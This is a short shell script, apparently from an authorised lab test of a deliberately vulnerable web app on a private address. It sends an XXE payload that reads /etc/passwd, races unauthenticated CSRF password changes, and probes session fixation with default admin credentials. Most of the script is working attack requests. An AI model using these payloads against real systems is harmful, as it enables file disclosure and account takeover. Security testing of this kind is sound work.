CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'
mkdir -p evidence/xxe evidence/logic evidence/race

RES=$(curl -s -b "$CK; security=low" -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$B/vulnerabilities/api/v2/user/1" -w '\nHTTP:%{http_code}')
printf '%s' "$RES" | grep -oE 'root:x|HTTP:[0-9]+' | head -3

echo "== race on low CSRF (10 concurrent, no token)"
for i in $(seq 1 10); do
  curl -s -b "$CK; security=low" "$B/vulnerabilities/csrf/?password_new=r$i&password_conf=r$i&Change=Change" -o /dev/null &
done
wait
echo "race done"

# restore
curl -s -b "$CK; security=low" "$B/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" | grep -c 'Password Changed'

# session-fixation check: login with our seed PHPSESSID; if unset or unchanged -> fix.
NEWSESS='aegistestsession0000000000000000000001'
CURLJAR=/tmp/fixcj; rm -f $CURLJAR
curl -s -c $CURLJAR -b "PHPSESSID=$NEWSESS; security=impossible" "$B/login.php" -o /tmp/lp
grep PHPSESSID $CURLJAR | awk '{print "issued-after-GET:",$NF}'
TOK=$(grep -oE "user_token' value='[0-9a-f]{32}" /tmp/lp | grep -oE '[0-9a-f]{32}' | head -1)
curl -s -c $CURLJAR -b $CURLJAR -d "username=admin&password=password&Login=Login&user_token=$TOK" "$B/login.php" -o /dev/null -w 'login-redirect:%{http_code}\n'
grep PHPSESSID $CURLJAR | awk '{print "issued-after-POST(rotate?):",$NF}'
